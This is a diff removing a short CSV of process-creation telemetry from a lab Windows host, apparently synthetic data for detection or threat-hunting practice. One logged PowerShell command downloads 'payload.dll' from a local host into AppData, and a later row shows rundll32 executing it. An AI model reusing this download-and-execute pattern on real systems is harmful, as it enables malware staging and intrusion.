@@ -1,6 +1,0 @@
-
-Timestamp,DeviceName,DeviceId,ActionType,FileName,ProcessId,ProcessCommandLine,ParentProcessName,ParentProcessId,IntegrityLevel
-2026-02-07T16:29:00.872121,PC-LAB-01.contoso.local,bc1cce4a-b68c-455e-9020-4781c44769e0,ProcessCreated,powershell.exe,4321,"powershell.exe -nop -c ""Invoke-WebRequest http://127.0.0.1:8080/payload.dll -OutFile C:\\Users\\user1\\AppData\\Roaming\\Microsoft\\Templates\\update.dll; Invoke-WebRequest http://127.0.0.1:8080/license.dat -OutFile C\\Users\\user1\\AppData\\Roaming\\license.dat""",explorer.exe,3000,Medium
-2026-02-07T16:29:09.872121,PC-LAB-01.contoso.local,bc1cce4a-b68c-455e-9020-4781c44769e0,ProcessCreated,rundll32.exe,6789,"rundll32.exe C:\\Users\\user1\\AppData\\Roaming\\Microsoft\\Templates\\update.dll,DllRegisterServer",powershell.exe,4321,Medium
-2026-02-07T16:29:05.872121,PC-LAB-01.contoso.local,bc1cce4a-b68c-455e-9020-4781c44769e0,ProcessCreated,explorer.exe,3000,explorer.exe,winlogon.exe,2000,Medium
-2026-02-07T16:29:12.872121,PC-LAB-01.contoso.local,bc1cce4a-b68c-455e-9020-4781c44769e0,ProcessCreated,notepad++.exe,9876,notepad++.exe C:\Users\user1\Documents\notes.txt,powershell.exe,4321,Medium
